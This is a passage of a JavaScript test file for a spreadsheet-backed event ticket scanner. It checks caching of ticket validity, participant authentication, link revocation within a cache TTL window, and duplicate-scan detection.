  const ticketSheet = spreadsheet.getSheetByName('valid_tickets');

  for (let i = 0; i < 3; i += 1) {
    assert.deepEqual(
      postRequest(context, { uuid: 'NEWTIX99' }),
      { result: 'error', code: 'invalid_ticket' },
      'a genuinely unknown UUID must never be cached as valid'
    );
  }

  ticketSheet.appendRow(['NEWTIX99']);
  assert.deepEqual(
    postRequest(context, { uuid: 'NEWTIX99' }),
    { result: 'success', duplicate: false },
    'a newly added ticket must be usable on the very next scan, not bounded by the cache TTL'
  );
}

// --- Caching: participant authentication ---

{
  // Repeated scans from the same device (same token) skip re-reading
  // participant_url once the participant is cached.
  const { context, stats } = createEnvironment();
  postRequest(context, { uuid: 'A1B2C3D4' });
  const dataReadsAfterFirst = stats.dataReadCalls.participant_url;
  postRequest(context, { uuid: '12345678' });
  assert.equal(
    stats.dataReadCalls.participant_url,
    dataReadsAfterFirst,
    'a second scan from an already-cached participant must not re-read participant_url data'
  );
}

{
  // Revocation/rotation tradeoff: caching an active participant means a
  // revoked link can keep working until the cache entry expires. This
  // test documents that bounded window explicitly, and proves it is
  // bounded (not permanent).
  const { context, spreadsheet, cache } = createEnvironment();
  const participantSheet = spreadsheet.getSheetByName('participant_url');
  const ieuRow = participantSheet.rows.findIndex(row => row[1] === 'ieu');

  assert.deepEqual(
    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001' }),
    { result: 'success', duplicate: false },
    'warms the participant cache for ieu'
  );

  // Revoke the link directly on the sheet, as an organizer would.
  participantSheet.rows[ieuRow][3] = false;

  assert.deepEqual(
    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0002' }),
    { result: 'success', duplicate: false },
    'within the cache TTL window, a just-revoked participant may still be accepted: a documented, bounded tradeoff'
  );

  // Simulate the TTL elapsing.
  cache.remove('p_' + sha256(CONFIGURED_TOKEN));

  assert.deepEqual(
    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0002' }),
    { result: 'error', code: 'unauthorized' },
    'once the cache entry is gone, revocation takes effect on the next scan'
  );
}

// --- Caching: duplicate detection ---

{
  // A cache-confirmed duplicate never re-reads Raw_Scans data.
  const { context, spreadsheet, stats } = createEnvironment();
  postRequest(context, { uuid: 'A1B2C3D4' });
  const dataReadsAfterWrite = stats.dataReadCalls.Raw_Scans || 0;
  postRequest(context, { uuid: 'A1B2C3D4' });
  assert.equal(
    stats.dataReadCalls.Raw_Scans || 0,
    dataReadsAfterWrite,
    'a cache-confirmed duplicate must not read Raw_Scans data again'
  );
  assert.deepEqual(spreadsheet.getSheetByName('Raw_Scans').getLastRow(), 2);
}

console.log('Code.gs authorization tests passed');
